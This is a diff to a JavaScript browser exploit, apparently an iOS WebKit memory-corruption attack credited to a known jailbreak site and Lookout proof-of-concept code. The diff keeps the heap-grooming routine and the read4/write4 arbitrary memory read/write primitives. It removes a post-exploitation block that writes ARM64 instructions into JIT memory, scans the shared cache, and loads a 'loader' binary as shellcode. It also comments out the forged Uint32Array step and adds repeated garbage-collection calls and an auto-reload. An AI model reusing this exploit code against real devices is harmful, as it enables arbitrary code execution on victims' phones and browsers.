@@ -1,10 +1,8 @@
 
 // Based on https://jbme.qwertyoruiop.com/
 // and lookout PoC code.
- var mem0 = 0;
- var mem1 = 0;
- var mem2 = 0;
- var pressure = new Array(100);
+
+
  var bufs = new Array(100);
  var stale = 0;
 
@@ -15,14 +13,15 @@
  var fcp = 0;
  var smsh = new Uint32Array(0x10)
  
-
+ var mem0 = 0;
+ var mem1 = 0;
+ var mem2 = 0;
  function read4(addr) {
  	mem0[4] = addr;
  	var ret = mem2[0];
  	mem0[4] = mem1;
  	return ret;
  }
-
  function write4(addr, val) {
  	mem0[4] = addr;
  	mem2[0] = val;
@@ -41,7 +40,8 @@
  }
 
 // dgc attempts to trigger a garbage collection by allocating a large amount of memory
-function dgc() {
+var pressure = new Array(100);
+dgc = function() {
  	for (var i = 0; i < pressure.length; i++) {
  		pressure[i] = new Uint32Array(0x10000);
  	}
@@ -84,69 +84,6 @@ for (var i = 0; i < 0x1000; i++){
  function smashed(stl) {
 	alert("Arbitrary code execution here.")
 	return 0;
-	 
- 	document.body.innerHTML = "win! " + smsh.length;
- 	var jitf = (smsh[(0x10 + smsh[(0x10 + smsh[(fcp + 0x18) / 4]) / 4]) / 4]);
- 	write4(jitf, 0xd28024d0);
- 	write4(jitf + 4, 0x58000060);
- 	write4(jitf + 8, 0xd4001001);
- 	write4(jitf + 12, 0xd65f03c0);
- 	write4(jitf + 16, jitf + 0x20);
- 	write4(jitf + 20, 1);
- 	fc();
- 	var dyncache = read4(jitf + 0x20);
- 	var dyncachev = read4(jitf + 0x20);
- 	var go = 1;
- 	while (go) {
- 		if (read4(dyncache) == 0xfeedfacf) {
- 			for (i = 0; i < 0x1000 / 4; i++) {
- 				if (read4(dyncache + i * 4) == 0xd && read4(dyncache + i * 4 + 1 * 4) == 0x40 && read4(dyncache + i * 4 + 2 * 4) == 0x18 && read4(dyncache + i * 4 + 11 * 4) == 0x61707369) // lulziest mach-o parser ever
- 				{
- 					go = 0;
- 					break;
- 				}
- 			}
- 		}
- 		dyncache += 0x1000;
- 	}
- 	dyncache -= 0x1000;
- 	var bss = [];
- 	var bss_size = [];
- 	for (i = 0; i < 0x1000 / 4; i++) {
- 		if (read4(dyncache + i * 4) == 0x73625f5f && read4(dyncache + i * 4 + 4) == 0x73) {
- 			bss.push(read4(dyncache + i * 4 + (0x20)) + dyncachev - 0x80000000);
- 			bss_size.push(read4(dyncache + i * 4 + (0x28)));
- 		}
- 	}
- 	var shc = jitf;
- 	var filestream = load_binary_resource("loader")
- 	for (var i = 0; i < filestream.length;) {
- 		var word = (filestream.charCodeAt(i) & 0xff) | ((filestream.charCodeAt(i + 1) & 0xff) << 8) | ((filestream.charCodeAt(i + 2) & 0xff) << 16) | ((filestream.charCodeAt(i + 3) & 0xff) << 24);
- 		write4(shc, word);
- 		shc += 4;
- 		i += 4;
- 	}
- 	jitf &= ~0x3FFF;
- 	jitf += 0x8000;
- 	write4(shc, jitf);
- 	write4(shc + 4, 1);
- 	// copy macho
- 	for (var i = 0; i < shll.length; i++) {
- 		write4(jitf + i * 4, shll[i]);
- 	}
- 	alert("All set. Close this alert and lock your screen to continue. See you on the other side!")
- 	for (var i = 0; i < bss.length; i++) {
- 		for (k = bss_size[i] / 6; k < bss_size[i] / 4; k++) {
- 			write4(bss[i] + k * 4, 0);
- 		}
- 	}
- 	fc();
- 	alert(2);
- }
-
- function go() {
- 	dgc();
- 	setTimeout(go_, 400);
  }
 
  function go_() {
@@ -235,6 +172,7 @@ for (var i = 0; i < 0x1000; i++){
 				alert('found structID for Uint32Array = '+structID);
 				alert('stale[0] is now: '+stale[0]);
 				
+				/*
 				// Make a fake Uint32Array
  				stale[0] = {
 					// 'a' is the forged JSCell header
@@ -295,7 +233,7 @@ for (var i = 0; i < 0x1000; i++){
 				}
 				
 				alert("After else if block");
-				
+				*/
 				
 				
 				/*
@@ -323,7 +261,21 @@ for (var i = 0; i < 0x1000; i++){
  		}
  	}
 	alert("Done executing. Did anything happen?")
- 	//document.location.reload();
+ 	setTimeout(function() {
+                document.location.reload();
+         }, 500);
  }
+
+function go() {
+    status('getting ready!');
+    dgc();
+    dgc();
+    dgc();
+    dgc();
+    dgc();
+    dgc();
+    setTimeout(go_, 400);
+}
+setTimeout(go, 5000);
 
 go();
